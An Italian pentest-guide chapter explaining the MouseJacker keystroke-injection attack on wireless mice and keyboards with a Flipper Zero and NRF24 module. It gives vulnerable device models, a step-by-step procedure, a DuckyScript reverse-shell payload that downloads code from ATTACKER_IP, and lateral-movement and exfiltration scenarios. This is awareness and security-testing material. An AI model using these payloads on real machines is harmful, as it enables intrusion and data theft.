## 3. MouseJacker -- Deep Dive

### 3.1 Cos'è il MouseJacker

MouseJacker è un attacco che sfrutta vulnerabilità nel protocollo di comunicazione tra periferiche wireless (mouse, tastiere) e i loro dongle USB. Pubblicato originariamente da Bastille Networks nel 2016 (ricercatori Marc Newlin e Balint Seeber), l'attacco permette di:

- Iniettare sequenze di tasti su un computer remoto
- Prendere controllo del cursore
- Eseguire comandi arbitrari sul sistema operativo della vittima
- Tutto via radio, senza contatto fisico con il PC target

L'attacco funziona perchè molte periferiche wireless inviano i loro dati in chiaro (senza crittografia) o con crittografia debole, e i dongle USB non autenticano adeguatamente il dispositivo che si connette.

### 3.2 Come funziona -- passo per passo

**Fase 1 -- Ricognizione:**

Il Flipper Zero con il modulo NRF24 scansiona i 126 canali alla ricerca di trasmissioni attive. I mouse wireless trasmettono pacchetti ogni volta che si muovono o vengono cliccati. L'attaccante cerca pattern di traffico compatibili con protocolli noti (Logitech Unifying, Microsoft, ecc.).

**Fase 2 -- Identificazione del target:**

Una volta rilevata attività, l'attaccante identifica:

- L'indirizzo della pipe del dispositivo (tipicamente 5 byte)
- Il canale RF utilizzato
- Il protocollo in uso
- Il tipo di dispositivo (mouse vs tastiera)

L'indirizzo pipe è l'elemento chiave. Con questo, l'attaccante può "parlare" direttamente al dongle USB come se fosse il dispositivo legittimo.

**Fase 3 -- Aggancio al dongle:**

L'attaccante configura il proprio NRF24 con:

- Lo stesso indirizzo pipe del dispositivo target
- Lo stesso canale RF
- Lo stesso data rate
- Lo stesso formato pacchetto

A questo punto il dongle USB non distingue tra i pacchetti legittimi del mouse e quelli iniettati dall'attaccante.

**Fase 4 -- Iniezione di payload:**

L'attaccante invia pacchetti che simulano la pressione di tasti sulla tastiera. Anche se il dispositivo originale è un mouse, molti dongle accettano pacchetti di tipo "tastiera" sullo stesso canale e indirizzo, perchè il protocollo Unifying supporta più tipi di dispositivi contemporaneamente.

I payload tipici includono:

- Apertura di una shell (Win+R su Windows, Ctrl+Alt+T su Linux)
- Download ed esecuzione di un reverse shell
- Disattivazione dell'antivirus
- Creazione di un utente backdoor
- Modifica di impostazioni di sicurezza

**Fase 5 -- Esecuzione:**

I comandi vengono digitati "a video" sul PC della vittima alla velocità del collegamento radio. Un payload completo può essere eseguito in 2-5 secondi. La vittima vede brevemente le finestre aprirsi e il testo digitarsi, ma spesso è troppo veloce per reagire.

### 3.3 Periferiche vulnerabili

**Logitech Unifying (pre-2016) -- TUTTE VULNERABILI:**

Il protocollo Logitech Unifying pre-2016 è il bersaglio principale:

- Mouse M185, M325, M510, M705, M570 (trackball)
- Tastiere K230, K270, K360, K400, K750
- Combo mouse+tastiera MK270, MK320, MK520
- Qualsiasi dispositivo con ricevitore Unifying arancione (pre-aggiornamento firmware)

Logitech ha rilasciato un aggiornamento firmware nel 2016 per mitigare (parzialmente) il problema, ma:

- Molti utenti non aggiornano mai il firmware del dongle
- Dongle più vecchi non supportano l'aggiornamento
- Anche dopo l'aggiornamento, alcune varianti dell'attacco funzionano ancora

**Mouse wireless economici (non-brand):**

- La maggior parte dei mouse wireless sotto i 15 euro non usa crittografia
- Molti usano il NRF24L01+ o cloni compatibili
- Protocolli proprietari spesso banali da reverse-engineerare
- Nessun meccanismo di autenticazione
- Vulnerabili per design

**Tastiere wireless non-AES:**

- Tastiere wireless che non implementano AES-128
- Alcune tastiere "criptate" usano XOR con chiave fissa -- facilmente bypassabile
- Tastiere Microsoft Wireless Desktop prima della serie 800
- Tastiere Logitech non-Unifying

**Dispositivi NON vulnerabili:**

- Periferiche Bluetooth (protocollo completamente diverso)
- Logitech con firmware aggiornato post-2016 (parzialmente)
- Tastiere con AES-128 reale (Microsoft Wireless Desktop 800+)
- Periferiche con protocolli proprietari criptati (rari)
- Periferiche cablate (ovviamente)

### 3.4 Varianti dell'attacco

**Mouse Jacker (standard QWERTY):**

L'app principale. Funziona con layout tastiera QWERTY (US International). Procedura:

1. Dal Flipper: GPIO > NRF24 > Mouse Jacker
2. Il Flipper scansiona automaticamente i canali
3. Quando trova un dispositivo, mostra indirizzo e canale
4. Selezionare il target
5. Scegliere il payload (script DuckyScript pre-caricato o personalizzato)
6. Eseguire l'iniezione

**AZERTY Mouse Jacker:**

Identico al precedente ma con mappatura tasti per layout AZERTY (Francia, Belgio). Essenziale quando il PC target usa layout francese, altrimenti i caratteri iniettati non corrispondono a quelli digitati.

Differenze dal QWERTY:

- Mappatura completa A/Q, Z/W, M e caratteri speciali
- Gestione di è è a` u`, c cediglia e altri caratteri accentati
- Supporto per AltGr (caratteri come @, #, {, }, [, ], ecc.)

**Mouse Jacker MS:**

Ottimizzato per periferiche Microsoft Wireless:

- Protocollo MS proprietario diverso da Logitech Unifying
- Tempi di aggancio ridotti per il frequency hopping MS
- Gestione dei formati pacchetto specifici MS
- Supporto per le funzioni extra dei mouse MS (tilt scroll, pulsanti laterali)

### 3.5 Procedura completa step-by-step

**Preparazione:**

1. Collegare il modulo NRF24L01+ (PA+LNA consigliato) al Flipper Zero
2. Verificare che il firmware supporti le app NRF24 (Unleashed o RogueMaster raccomandati)
3. Preparare i payload DuckyScript e copiarli nella SD card del Flipper (cartella /ext/nrf24/mousejacker/)
4. Posizionarsi entro la portata del target (10-50m indoor con PA+LNA)

**Payload di esempio (DuckyScript per Windows reverse shell):**

```
REM MouseJacker payload - Reverse Shell Windows
DELAY 500
GUI r
DELAY 300
STRING powershell -w hidden -nop -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/shell.ps1')"
ENTER
```

**Payload di esempio (DuckyScript per apertura notepad - demo non distruttiva):**

```
REM Demo payload - apre notepad e scrive un messaggio
DELAY 500
GUI r
DELAY 300
STRING notepad.exe
ENTER
DELAY 500
STRING Questo PC è vulnerabile a MouseJacker.
STRING Contattare il team IT per aggiornare le periferiche wireless.
```

**Scansione e attacco:**

1. Sul Flipper: andare in GPIO > NRF24 > Mouse Jacker
2. Attendere la scansione automatica dei canali
3. Il Flipper mostrerà i dispositivi trovati con indirizzo e tipo
4. Selezionare il target desiderato
5. Selezionare il payload DuckyScript dalla lista
6. Premere OK per iniziare l'iniezione
7. Osservare il risultato sul PC target

**Troubleshooting:**

- Se non trova dispositivi: verificare che il target stia usando il mouse (deve trasmettere pacchetti)
- Se l'iniezione fallisce: verificare il layout tastiera (QWERTY vs AZERTY vs altro)
- Se il payload si corrompe: ridurre la velocità di iniezione, aggiungere DELAY tra i comandi
- Se il canale cambia: il protocollo Unifying usa frequency hopping -- riprovare
- Se la portata è insufficiente: usare la versione PA+LNA con antenna esterna

### 3.6 Scenari di demo

**Scenario 1 -- Awareness aziendale:**

Obiettivo: dimostrare al management il rischio delle periferiche wireless non protette.

1. Identificare un PC con mouse wireless Logitech Unifying in sala riunioni
2. Dal corridoio, eseguire il MouseJacker
3. Iniettare un payload che apre notepad e scrive un messaggio di avviso
4. Mostrare il risultato ai presenti

Impatto: visuale e immediato. Nessun danno ma altissimo impatto comunicativo.

**Scenario 2 -- Lateral movement in pentest:**

Obiettivo: ottenere accesso a un PC interno che non è raggiungibile via rete.

1. Dalla postazione compromessa, identificare periferiche wireless nelle vicinanze
2. Iniettare un payload che apre PowerShell e scarica un agente C2
3. Il nuovo agente stabilisce una connessione con il server di comando
4. L'attaccante ha ora accesso a due postazioni

Impatto: critico. Permette lateral movement senza traffico di rete sospetto.

**Scenario 3 -- Exfiltration via HID:**

Obiettivo: esfiltrare dati da un PC air-gapped che usa periferiche wireless.

1. Iniettare comandi che leggono file sensibili
2. Codificare il contenuto in base64
3. Iniettare comandi che inviano i dati codificati via DNS o HTTP
4. Ricevere i dati sul server dell'attaccante

> Nota personale: il MouseJacker è l'attacco che lascia a bocca aperta durante le demo. La prima volta che l'ho eseguito con successo su un PC in sala riunioni, dal corridoio, il CISO dell'azienda ha immediatamente ordinato la sostituzione di tutte le periferiche wireless con modelli Bluetooth o cablati. Nessun report PDF ha mai avuto lo stesso impatto di 10 secondi di MouseJacker dal vivo. Usatelo nelle demo -- è l'arma definitiva per far capire il rischio wireless.

---

